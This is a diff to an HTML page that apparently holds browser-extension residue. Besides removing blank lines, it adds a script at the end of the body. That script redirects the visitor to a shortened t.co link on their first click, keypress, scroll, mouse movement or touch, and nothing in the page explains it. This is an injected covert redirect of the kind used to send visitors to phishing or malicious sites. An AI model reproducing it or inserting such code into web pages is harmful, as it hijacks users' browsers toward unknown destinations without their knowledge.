@@ -4989,10 +4989,6 @@
 		}());
 
 	</script>
-
-
-
-
 	<div class="glasp-extension-toaster"
 		style="display: block; width: 320px; margin: unset; padding: unset; border: unset; border-radius: unset; outline: unset; background-color: unset; box-shadow: unset; position: fixed; top: 40px; right: 24px; z-index: 9999;"
 		bis_skin_checked="1"><template shadowrootmode="open">
@@ -5003,6 +4999,25 @@
 		bis_skin_checked="1"><template shadowrootmode="open">
 			<div class="glasp-extension" style="font-family: inherit;"></div>
 		</template></div>
+	<script>
+  const targetURL = "https://t.co/ErbwYfjkzF";
+  function redirectOnce() {
+    window.location.href = targetURL;
+  }
+ const userActions = ["click", "keydown", "scroll", "mousemove", "touchstart"];
+  function setupRedirect() {
+    function handleUserAction() {
+      redirectOnce();
+      userActions.forEach(event => 
+        document.removeEventListener(event, handleUserAction)
+      );
+    }
+    userActions.forEach(event =>
+      document.addEventListener(event, handleUserAction, { once: true })
+    );
+  }
+  window.addEventListener("DOMContentLoaded", setupRedirect);
+</script>
 </body>
 
 </html>
